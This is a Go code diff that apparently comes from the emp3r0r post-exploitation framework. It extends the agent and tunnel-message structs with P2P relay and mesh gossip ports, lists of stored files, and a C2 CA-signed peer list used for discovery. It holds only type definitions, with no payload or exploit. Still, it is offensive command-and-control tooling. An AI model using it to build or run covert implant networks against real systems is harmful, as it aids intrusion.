@@ -41,8 +41,28 @@ type Emp3r0rAgent struct {
 	C2Host      string        `cbor:"30,keyasint"` // C2 server's IP or domain name that the agent is connected to
 	LastSeen    time.Time     `cbor:"31,keyasint"` // last time the agent was seen
 	LastSeenRTT time.Duration `cbor:"32,keyasint"` // last RTT of the agent
-	AgentToken  *AgentToken   `cbor:"36,keyasint"` // current token issued by C2
-	MeshRoute   string        `cbor:"37,keyasint"` // p2p routing role or gateway used by this agent
+	AgentToken     *AgentToken   `cbor:"36,keyasint"` // current token issued by C2
+	MeshRoute      string        `cbor:"37,keyasint"` // p2p routing role or gateway used by this agent
+	P2PRelayPort   string        `cbor:"38,keyasint"` // dynamic P2P relay port assigned to this agent
+	MeshGossipPort string        `cbor:"39,keyasint"` // dynamic mesh gossip port assigned to this agent
+	Files          []string      `cbor:"40,keyasint"` // list of available files/modules in agent storage/MemFS
+}
+
+// EnrichedPeer holds detailed peer information signed by C2
+type EnrichedPeer struct {
+	UUID           string   `cbor:"1,keyasint"`
+	IPs            []string `cbor:"2,keyasint"`
+	From           string   `cbor:"3,keyasint"`
+	P2PRelayPort   string   `cbor:"4,keyasint"`
+	MeshGossipPort string   `cbor:"5,keyasint"`
+	Files          []string `cbor:"6,keyasint"`
+	LastSeen       int64    `cbor:"7,keyasint"`
+}
+
+// EnrichedPeerList represents the C2 CA-signed list of active peers
+type EnrichedPeerList struct {
+	Peers     []EnrichedPeer `cbor:"1,keyasint"`
+	Signature []byte         `cbor:"2,keyasint"` // CA signature over CBOR of Peers
 }
 
 // AgentProcess process info of our agent
@@ -56,13 +76,14 @@ type AgentProcess struct {
 // MsgTunData data to send in the tunnel, between C&C and agent
 // this can also be used for operator to CC communication
 type MsgTunData struct {
-	JobID          string   `cbor:"1,keyasint"` // job ID, to retrieve the response, or empty if not a command
-	CmdSlice       []string `cbor:"2,keyasint"` // command args, [0] is the command, or empty if not a command
-	Response       []byte   `cbor:"3,keyasint"` // response from the agent, or message to operator
-	Tag            string   `cbor:"4,keyasint"` // tag of the agent, or message type if sent to operator
-	Time           string   `cbor:"5,keyasint"` // timestamp
-	AgentUUID      string   `cbor:"6,keyasint"` // agent UUID for robust identification
-	AgentUUIDSig   string   `cbor:"7,keyasint"` // agent UUID signature for verification
-	EphemPublicKey []byte   `cbor:"8,keyasint"` // ephemeral public key for ECDH key exchange
-	PeerList       []string `cbor:"9,keyasint"` // pushed by CC to help with discovery
+	JobID            string            `cbor:"1,keyasint"`  // job ID, to retrieve the response, or empty if not a command
+	CmdSlice         []string          `cbor:"2,keyasint"`  // command args, [0] is the command, or empty if not a command
+	Response         []byte            `cbor:"3,keyasint"`  // response from the agent, or message to operator
+	Tag              string            `cbor:"4,keyasint"`  // tag of the agent, or message type if sent to operator
+	Time             string            `cbor:"5,keyasint"`  // timestamp
+	AgentUUID        string            `cbor:"6,keyasint"`  // agent UUID for robust identification
+	AgentUUIDSig     string            `cbor:"7,keyasint"`  // agent UUID signature for verification
+	EphemPublicKey   []byte            `cbor:"8,keyasint"`  // ephemeral public key for ECDH key exchange
+	PeerList         []string          `cbor:"9,keyasint"`  // pushed by CC to help with discovery
+	EnrichedPeerList *EnrichedPeerList `cbor:"10,keyasint"` // C2 CA-signed enriched peer list
 }
